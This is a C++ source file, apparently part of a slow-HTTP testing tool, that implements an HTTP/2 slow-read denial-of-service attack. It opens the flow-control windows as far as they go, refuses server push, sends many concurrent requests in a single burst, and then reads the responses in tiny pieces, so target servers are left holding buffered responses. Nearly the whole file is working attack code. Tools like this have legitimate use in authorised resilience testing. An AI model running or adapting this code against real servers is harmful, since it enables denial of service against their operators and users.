// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_read_h2.hpp"

#include <algorithm>

#include "slowhttp/http2.hpp"

namespace slowhttp {

namespace {

// The connection-level flow-control window starts at 65535 (RFC 7540 section
// 6.9.2) regardless of SETTINGS, which only governs stream windows. Left alone
// it caps the whole connection at 64 KB and the attack stops being interesting
// after the first response, so it is opened explicitly.
constexpr std::uint32_t kConnectionWindowStart = 65535u;

}  // namespace

SlowReadH2::SlowReadH2(const Config& cfg)
    : cfg_(cfg),
      streams_(cfg.h2_streams < 1 ? 1 : cfg.h2_streams),
      read_interval_(
          std::chrono::duration_cast<std::chrono::milliseconds>(
              cfg.read_interval)),
      read_len_(static_cast<std::size_t>(cfg.read_len < 1 ? 1 : cfg.read_len)),
      rng_(std::random_device{}()),
      per_conn_read_(static_cast<std::size_t>(cfg.connections), 0) {
  handshake_ = build_handshake();
}

ConnOptions SlowReadH2::conn_options(ConnId /*id*/) {
  int lo = std::max(1, cfg_.window_lower);
  int hi = std::max(lo, cfg_.window_upper);
  std::uniform_int_distribution<int> dist(lo, hi);
  ConnOptions opts;
  opts.recv_buffer = dist(rng_);
  return opts;
}

void SlowReadH2::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < per_conn_read_.size())
    per_conn_read_[id] = 0;
}

Action SlowReadH2::on_connect(ConnId /*id*/) {
  // The whole opening burst goes out at once: preface, settings, the connection
  // window, and every stream. There is nothing to wait for -- the server's
  // SETTINGS would be worth reading if this tool intended to respect its
  // limits, and it does not need to in order to ask for too much.
  return Action::send(handshake_, read_interval_);
}

Action SlowReadH2::on_timer(ConnId /*id*/) {
  return Action::read(read_len_, read_interval_);
}

Action SlowReadH2::on_readable(ConnId id, const char* /*data*/,
                               std::size_t len) {
  bytes_read_ += static_cast<long>(len);
  if (id >= 0 && static_cast<std::size_t>(id) < per_conn_read_.size())
    per_conn_read_[id] += static_cast<long>(len);
  return Action::idle();
}

void SlowReadH2::append_request(std::string& out,
                                std::uint32_t stream_id) const {
  std::string block;
  // Pseudo-headers first and in this order, per RFC 7540 section 8.1.2.1. A
  // server is entitled to reset the stream if they are not.
  http2::hpack_literal(block, ":method", cfg_.effective_verb());
  http2::hpack_literal(block, ":scheme", cfg_.target.tls() ? "https" : "http");
  http2::hpack_literal(block, ":authority", cfg_.target.host_header());
  http2::hpack_literal(block, ":path", cfg_.target.path);

  // Header names must be lowercase in HTTP/2; the 1.1 spellings would be
  // malformed. Connection-specific headers are omitted entirely for the same
  // reason (RFC 7540 section 8.1.2.2).
  http2::hpack_literal(block, "user-agent", cfg_.user_agent);
  http2::hpack_literal(block, "accept", cfg_.accept);
  // Cookie, Referer and every -1 header, from the same place the HTTP/1.1
  // attacks get them, so an authenticated or host-routed target is addressed
  // identically whichever protocol carries the attack.
  for (const auto& h : cfg_.caller_headers_h2())
    http2::hpack_literal(block, h.first, h.second);

  // END_STREAM: the request is complete, so the server may answer immediately
  // and start filling its buffers. Withholding it would be a different attack
  // -- the CONTINUATION/header-timeout family -- and is not what this one does.
  http2::write_frame(
      out, http2::FrameType::Headers,
      static_cast<std::uint8_t>(http2::kFlagEndStream | http2::kFlagEndHeaders),
      stream_id, block);
}

std::string SlowReadH2::build_handshake() const {
  std::string out;
  out += http2::kPreface;

  // Open the stream window as far as the protocol allows, and refuse push so
  // the server does not spend its budget on streams this client never asked
  // for -- the point is to make it queue *this* response.
  http2::write_frame(
      out, http2::FrameType::Settings, http2::kFlagNone, 0,
      http2::settings_payload(
          {{http2::kSettingsInitialWindowSize, http2::kMaxWindow},
           {http2::kSettingsEnablePush, 0}}));

  // And the connection window, which SETTINGS does not cover.
  http2::write_frame(
      out, http2::FrameType::WindowUpdate, http2::kFlagNone, 0,
      http2::window_update_payload(http2::kMaxWindow - kConnectionWindowStart));

  // Client-initiated streams are odd and must ascend (RFC 7540 section 5.1.1).
  std::uint32_t id = 1;
  for (int i = 0; i < streams_; ++i, id += 2) append_request(out, id);
  return out;
}

}  // namespace slowhttp
